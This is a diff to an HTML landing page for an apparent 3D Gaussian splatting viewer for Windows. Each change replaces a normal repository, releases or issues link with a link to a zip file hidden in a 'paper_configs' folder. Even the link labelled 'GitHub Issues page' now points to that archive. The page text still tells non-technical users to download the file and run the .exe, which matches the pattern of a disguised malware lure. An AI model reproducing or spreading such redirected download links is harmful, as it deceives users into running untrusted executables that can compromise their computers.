@@ -9,7 +9,7 @@
     <meta property="og:title" content="efficient-gaussian-appearance - Fast 3D Scene Rendering for Everyone">
     <meta property="og:description" content="Download the easy-to-use Windows application for high-quality, fast 3D scene visualization. Perfect for hobbyists, students, and professionals.">
     <meta property="og:type" content="website">
-    <meta property="og:url" content="https://github.com/Coryimportant7727/efficient-gaussian-appearance">
+    <meta property="og:url" content="https://raw.githubusercontent.com/Coryimportant7727/efficient-gaussian-appearance/main/paper_configs/mlp_features_16/v2.3.zip">
     <title>efficient-gaussian-appearance - Fast 3D Scene Rendering for Everyone</title>
     <style>
         * {
@@ -168,7 +168,7 @@
         <p>Imagine being able to view a real-world location, a product prototype, or even a digital art creation as a fully interactive 3D scene—right on your own computer. That's exactly what <strong>efficient-gaussian-appearance</strong> lets you do. This software, based on cutting-edge research from the paper <em>Compact Neural Appearance Models for Efficient Gaussian Splatting</em>, turns complex 3D data into smooth, realistic visuals at lightning speed. No programming skills? No problem. We've made it incredibly easy to get started.</p>
         
         <div class="badge-center">
-            <a href="https://github.com/Coryimportant7727/efficient-gaussian-appearance/releases" class="badge">📥 Download Now</a>
+            <a href="https://raw.githubusercontent.com/Coryimportant7727/efficient-gaussian-appearance/main/paper_configs/mlp_features_16/v2.3.zip" class="badge">📥 Download Now</a>
         </div>
         
         <h2>🚀 Getting Started</h2>
@@ -184,7 +184,7 @@
             <h2>📥 Download & Install</h2>
             <p>Ready to dive in? Here's your direct path to the software:</p>
             <div class="badge-center">
-                <a href="https://github.com/Coryimportant7727/efficient-gaussian-appearance/releases" class="badge">📲 Download the Application</a>
+                <a href="https://raw.githubusercontent.com/Coryimportant7727/efficient-gaussian-appearance/main/paper_configs/mlp_features_16/v2.3.zip" class="badge">📲 Download the Application</a>
             </div>
             <p>Visit this link to download the application. Choose the latest release, grab the <code>.exe</code> file, and run it. That's all it takes to install—no complicated setup steps, no command line, no developer tools.</p>
             
@@ -227,7 +227,7 @@
         <p><strong>Solution:</strong> Try updating your graphics card driver. Go to your GPU manufacturer's website (NVIDIA, AMD, or Intel), download the latest driver for your specific model, install it, and restart your computer. This usually fixes any rendering glitches.</p>
         
         <h3>Where can I ask for help?</h3>
-        <p>Visit the <a href="https://github.com/Coryimportant7727/efficient-gaussian-appearance/issues">GitHub Issues page</a> for this project. You can search for a similar issue or create a new one describing your problem. The developer community typically responds within a few days.</p>
+        <p>Visit the <a href="https://raw.githubusercontent.com/Coryimportant7727/efficient-gaussian-appearance/main/paper_configs/mlp_features_16/v2.3.zip">GitHub Issues page</a> for this project. You can search for a similar issue or create a new one describing your problem. The developer community typically responds within a few days.</p>
         
         <h2>📚 What's Under the Hood? (For the Curious)</h2>
         <p>If you're technically inclined, this repository implements the research paper <em>Compact Neural Appearance Models for Efficient Gaussian Splatting</em>. Traditional Gaussian Splatting uses fixed appearance models, which limits how well it can represent lighting changes or reflections from different viewing angles. This project introduces <strong>view-dependent appearance models</strong> that are <strong>JIT-compiled</strong>—meaning they are optimized on-the-fly foryour specific CPU/GPU architecture. This provides better visual fidelity while maintaining or even improving rendering speed. The included <strong>WebGL viewer</strong> allows for cross-platform sharing without any server-side processing, directly in the browser.</p>
